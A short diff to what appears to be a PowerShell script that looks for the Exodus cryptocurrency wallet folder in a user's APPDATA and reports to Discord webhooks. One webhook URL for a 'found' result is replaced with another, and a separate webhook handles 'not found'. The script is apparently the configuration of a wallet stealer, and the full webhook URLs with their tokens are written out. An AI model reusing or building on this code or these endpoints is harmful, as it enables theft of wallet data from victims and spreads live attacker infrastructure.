@@ -1,4 +1,4 @@
-$discordHookFound = 'https://discord.com/api/webhooks/1436649396682100839/zHCDc5BuZST79aHhaTnJCIAgJDWKH59g981wDegqW-XhthyrmPn86COuQ68ZpP7hKTiI'
+$discordHookFound = 'https://discord.com/api/webhooks/1439666084205822022/X6QeRBbzi6cCc-uIESH4b7kYa1FK7pKIejGSwki57HqIIksAuXPMzFE-cpXcq-XchXCm'
 $discordHookNotFound = 'https://discord.com/api/webhooks/1437121398605742204/A-T3rrS_fyvQxuIxjdfbwDUDOdMrrIqpsP6F9q8I1CDWA5U7DMOo_CvtsFQZCiimADZt'
 $exodusDir = Join-Path $env:APPDATA 'Exodus'
 $avatarUrl = 'https://i.imgur.com/4NJG86V.png'
